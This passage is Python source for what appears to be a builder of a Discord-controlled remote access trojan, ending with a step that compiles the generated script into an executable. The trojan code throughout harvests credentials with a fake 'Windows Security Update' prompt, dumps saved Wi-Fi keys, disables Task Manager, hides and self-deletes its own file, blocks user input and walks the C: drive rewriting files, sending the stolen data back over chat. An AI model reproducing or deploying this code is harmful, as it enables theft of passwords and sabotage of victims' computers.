        if message.content == "!selfdestruct": #prob beter way to do dis
            import inspect
            import os
            import sys
            import inspect
            uncritproc()
            cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
            hello = os.getpid()
            bat = \"""@echo off\""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r\"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b\"""
            temp = (os.getenv("TEMP"))
            temp5 = temp + r"\delete.bat"
            if os.path.isfile(temp5):
                delelee = "del " + temp5 + r" /f"
                os.system(delelee)                
            f5 = open(temp + r"\delete.bat", 'a')
            f5.write(bat)
            f5.close()
            os.system(r"start /min %temp%\delete.bat")
        if message.content == "!windowspass":
            import sys
            import subprocess
            import os
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
            instruction = full_cmd
            def shell():   
                output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            result = str(shell().stdout.decode('CP437'))
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("password user typed in is: " + result)
        if message.content == "!displayoff":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!displayon":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                from pynput.keyboard import Key, Controller
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!hide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(\"""attrib +h "{}" \""".format(cmd237))
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!unhide":
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(\"""attrib -h "{}" \""".format(cmd237))
            await message.channel.send("[*] Command successfuly executed")
        #broken. might fix if someone want me too.
        if message.content == "!decode" or message.content == "!encode":
            import os
            import base64
            def encode(file):
                f = open(file)
                data = f.read()
                f.close()
                data = data.encode("utf-8")
                encodedBytes = base64.b64encode(data)
                os.remove(file)
                file = file + '.rip'
                t = open(file, "w+")
                encodedBytes = encodedBytes.decode("utf-8")
                t.write(encodedBytes)
                t.close()
            def decode(file):
                f = open(file)
                data = f.read()
                f.close()
                data = data.encode("utf-8")
                decodedBytes = base64.b64decode(data)
                os.remove(file)
                file = file.replace('.rip', '')
                t = open(file, "w+")
                decodedBytes = decodedBytes.decode("utf-8")
                t.write(decodedBytes)
                t.close()
            parentDirectory = 'C:\\\\'
            for root, dirs, files in os.walk(parentDirectory):
                for afile in files:
                    full_path = os.path.join(root, afile)
                    if message.content == "!encode":
                        encode(full_path)
                        await message.channel.send("[*] Command successfuly executed")
                    if message.content == ('!decode') and full_path.endswith('.rip'):
                        decode(full_path)
                        await message.channel.send("[*] Command successfuly executed")
        if message.content == "!ejectcd":
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!retractcd":
            import ctypes
            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!critproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                critproc()
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send(r"[*] Not admin :(")
        if message.content == "!uncritproc":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                uncritproc()
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send(r"[*] Not admin :(")
        if message.content.startswith("!website"):
            import subprocess
            website = message.content[9:]
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!distaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                import time
                statuuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    import winreg as reg
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!enbtaskmgr":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    global statusuusss
                    import time
                    statusuusss = None
                    import subprocess
                    import os
                    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                    def shell():
                        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        global status
                        statusuusss = "ok"
                        return output
                    import threading
                    shel = threading.Thread(target=shell)
                    shel._running = True
                    shel.start()
                    time.sleep(1)
                    shel._running = False
                    result = str(shell().stdout.decode('CP437'))
                    if len(result) <= 5:
                        await message.channel.send("[*] Command successfuly executed")  
                    else:
                        import winreg as reg
                        reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                        await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!getwifipass":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    import os
                    import subprocess
                    import json
                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                    x = x[x.find("User profiles\\r\\n-------------\\r\\n")+len("User profiles\\r\\n-------------\\r\\n"):len(x)].replace('\\r\\n\\r\\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
                    lst = []
                    done = []
                    for i in x.splitlines():
                        i = i.replace('"All User Profile"     : ',"")
                        b = -1
                        while True:
                            b = b + 1
                            if i.startswith(" "):
                                i = i[1:]
                            if b >= len(i):
                                break
                        lst.append(i)
                    lst.remove('')
                    for e in lst:
                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                        for i in output.splitlines():
                            if i.find("Key Content") != -1:
                                ok = i[4:].replace("Key Content            : ","")
                                break
                        almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                        done.append(almoast)
                    await message.channel.send("[*] Command successfuly executed")  
                    await message.channel.send(done)
            else:
                await message.channel.send("[*] This command requires admin privileges")
client.run(token)""".replace("~~TOKENHERE~~", tokenbot))

    except Exception as e:
        print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error writing file: {e}""")
        os.system(2)
        os.system('cls')
        main()

    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "temp/{fileName}.py" """)
    convert = input(f"""{y}[{b}#{y}]{w} Convert your script into an executable (Y/N) ? """)
    if convert == 'Y' or convert == 'y':
        try:
                time.sleep(1)
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f'{y}[{b}#{y}]{w} File creation...')
                time.sleep(1)
                os.system(f"pyinstaller -y -F temp/{fileName}.py")
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f'{y}[{b}#{y}]{w} Cleaning up old files...')
                time.sleep(1)
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.rmtree(f"temp/__pycache__")
                shutil.move(f"dist/{fileName}.exe", "temp")
                shutil.rmtree(f"dist")
                time.sleep(1)
                os.system('cls' if os.name == 'nt' else 'clear')
                rattitle()
                print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
        except Exception as e:
                rattitle()
                print(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} Error: {e}")
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    else:
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    main()

discordrat()